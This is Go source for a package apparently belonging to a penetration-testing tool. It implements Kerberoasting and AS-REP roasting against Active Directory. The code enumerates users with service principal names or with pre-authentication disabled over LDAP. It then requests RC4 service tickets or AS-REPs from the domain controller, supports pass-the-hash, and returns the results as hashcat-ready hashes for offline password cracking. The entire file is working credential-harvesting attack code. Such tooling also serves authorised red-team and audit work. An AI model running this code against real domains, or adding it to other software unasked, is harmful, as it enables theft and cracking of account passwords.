// Package roast implements Kerberoasting and AS-REP roasting: find
// roastable domain users (LDAP) and request RC4 service tickets /
// no-preauth AS-REPs (KDC), yielding crackable hashes in hashcat format.
// Mirrors tools/GetUserSPNs (-request) and tools/GetNPUsers exactly.
package roast

import (
	"fmt"
	"time"

	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/session"

	"anvil/internal/ui"
)

// Hash is one crackable service-ticket hash (hashcat $krb5tgs$ form).
type Hash struct {
	Username string
	SPN      string
	Line     string
}

// Kerberoast requests service tickets for every SPN-bearing domain user
// and returns the crackable hashes. realm is the Kerberos realm in DNS
// form (e.g. CORP.LOCAL, from the SMB session's NTLM challenge info) —
// the KDC rejects NetBIOS-form realms ("CRealm does not match"). Two
// transient channels are used — LDAP (SPN lookup) and the KDC (TGS
// requests) — opened once, closed once. Per-user ticket failures are
// reported as warnings, never fatal (mirrors tools/GetUserSPNs, which
// prints "[-] Failed" and continues).
func Kerberoast(dcHost, realm string, creds *session.Credentials) (hashes []Hash, warnings []string, err error) {
	if creds.Domain == "" {
		return nil, nil, fmt.Errorf("domain required for kerberoast (pass -d)")
	}
	if realm == "" {
		realm = creds.Domain // last resort; NetBIOS realms fail at the KDC
		ui.Debugf("kerberoast: no DNS realm from session, falling back to %q", realm)
	}

	// 1. LDAP channel: find SPN-bearing users.
	client := ldap.NewClient(session.Target{Host: dcHost}, creds)
	defer client.Close()
	if err := client.Connect(false); err != nil {
		return nil, nil, fmt.Errorf("ldap connect: %v", err)
	}
	loginUser := fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
	if err := client.LoginWithUser(loginUser); err != nil {
		if err := client.Login(); err != nil {
			return nil, nil, fmt.Errorf("ldap bind (authenticated user required): %v", err)
		}
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return nil, nil, fmt.Errorf("naming context: %v", err)
	}
	users, err := client.FindSPNUsersWithOptions(baseDN, ldap.SPNQueryOptions{})
	if err != nil {
		return nil, nil, fmt.Errorf("SPN search: %v", err)
	}

	// 2. KDC channel: one RC4 TGS per SPN-bearing user (pass-the-hash
	// supported, mirroring tools/GetUserSPNs).
	nthash := ""
	if creds.Hash != "" {
		nthash, err = kerberos.ParseHashes(creds.Hash)
		if err != nil {
			return nil, nil, err
		}
	}

	for _, u := range users {
		if len(u.SPNs) == 0 {
			continue
		}
		spn := u.SPNs[0]

		var result *kerberos.TGSResult
		if nthash != "" {
			result, err = kerberos.GetTGSWithHash(creds.Username, nthash, realm, dcHost, u.Username, spn)
		} else {
			result, err = kerberos.GetTGS(creds.Username, creds.Password, realm, dcHost, u.Username, spn)
		}
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("TGS for %s (%s) failed: %v", u.Username, spn, err))
			continue
		}
		hashes = append(hashes, Hash{Username: u.Username, SPN: spn, Line: result.Hash})

		// Small delay to avoid overwhelming the KDC (tools/GetUserSPNs).
		time.Sleep(50 * time.Millisecond)
	}
	return hashes, warnings, nil
}

// ASRepHash is one crackable no-preauth AS-REP hash (hashcat
// $krb5asrep$ form). Unlike a TGS hash there is no SPN — the target is
// the user's own TGT exchange.
type ASRepHash struct {
	Username string
	Line     string
}

// ASRep finds domain users with DONT_REQ_PREAUTH set (LDAP,
// userAccountControl bit 0x400000) and requests one AS-REP per user from
// the KDC, returning the crackable hashes. realm is the Kerberos realm in
// DNS form (e.g. CORP.LOCAL, from the SMB session's NTLM challenge info) —
// the KDC rejects NetBIOS-form realms ("CRealm does not match"). Two
// transient channels are used — LDAP (user lookup) and the KDC (AS-REQs) —
// opened once, closed once. The KDC half needs no credentials (that is the
// point of the attack: the KDC answers AS-REQs for these users without
// pre-authentication), but the LDAP lookup does. Per-user failures are
// reported as warnings, never fatal (mirrors tools/GetNPUsers, which
// prints "[-] Failed" and continues).
func ASRep(dcHost, realm string, creds *session.Credentials) (hashes []ASRepHash, warnings []string, err error) {
	if creds.Domain == "" {
		return nil, nil, fmt.Errorf("domain required for asrep (pass -d)")
	}
	if realm == "" {
		realm = creds.Domain // last resort; NetBIOS realms fail at the KDC
		ui.Debugf("asrep: no DNS realm from session, falling back to %q", realm)
	}

	// 1. LDAP channel: find users with DONT_REQ_PREAUTH.
	client := ldap.NewClient(session.Target{Host: dcHost}, creds)
	defer client.Close()
	if err := client.Connect(false); err != nil {
		return nil, nil, fmt.Errorf("ldap connect: %v", err)
	}
	loginUser := fmt.Sprintf("%s@%s", creds.Username, creds.Domain)
	if err := client.LoginWithUser(loginUser); err != nil {
		if err := client.Login(); err != nil {
			return nil, nil, fmt.Errorf("ldap bind (authenticated user required): %v", err)
		}
	}
	baseDN, err := client.GetDefaultNamingContext()
	if err != nil {
		return nil, nil, fmt.Errorf("naming context: %v", err)
	}
	users, err := client.FindNPUsers(baseDN)
	if err != nil {
		return nil, nil, fmt.Errorf("DONT_REQ_PREAUTH search: %v", err)
	}

	// 2. KDC channel: one AS-REQ per vulnerable user (no creds needed —
	// tools/GetNPUsers -request). getASREP (local, io.ReadFull — see
	// asrep.go) uppercases the realm itself and requests RC4 (etype 23)
	// for faster cracking, matching Impacket.
	for _, u := range users {
		line, err := getASREP(u.Username, realm, dcHost)
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("AS-REP for %s failed: %v", u.Username, err))
			continue
		}
		hashes = append(hashes, ASRepHash{Username: u.Username, Line: line})

		// Small delay to avoid overwhelming the KDC (tools/GetUserSPNs).
		time.Sleep(50 * time.Millisecond)
	}
	return hashes, warnings, nil
}
